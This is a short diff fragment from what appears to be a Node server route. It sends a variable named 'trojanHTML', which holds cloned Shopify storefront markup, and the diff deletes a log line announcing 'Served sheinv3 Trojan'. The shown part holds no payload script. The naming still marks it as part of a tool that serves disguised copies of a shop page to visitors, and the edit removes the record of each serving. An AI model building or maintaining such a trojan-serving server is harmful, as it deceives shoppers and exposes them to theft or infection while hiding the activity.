@@ -4832,7 +4832,6 @@ Item added to your cart
 <div tabindex="-1" aria-hidden="true" id="web-pixels-manager-sandbox-container" style="height: 0px !important; width: 0px !important; position: fixed !important; visibility: hidden !important; overflow: hidden !important; z-index: -100 !important; margin: 0px !important; padding: 0px !important; border: 0px !important;"><iframe tabindex="-1" aria-hidden="true" name="web-pixel-sandbox-CUSTOM-shopify-custom-pixel-LAX-960565caw95f6f6d6pe10748f4mf4569064" src="https://bf9fa1-7d.myshopify.com/wpm@960565caw95f6f6d6pe10748f4mf4569064/custom/web-pixel-shopify-custom-pixel@0121/sandbox/modern/" id="web-pixel-sandbox-CUSTOM-shopify-custom-pixel-LAX-960565caw95f6f6d6pe10748f4mf4569064" sandbox="allow-scripts allow-forms" style="height: 0px !important; width: 0px !important; visibility: hidden !important;"></iframe></div><div id="61a6f528-fd0c-4162-9d79-5cf215330f3f" style="z-index: 2147483647 !important; display: block !important;"></div></body></html>
     `
             res.send(trojanHTML);
-     console.log(`Served sheinv3 Trojan (${slug})`);
 });
 
 
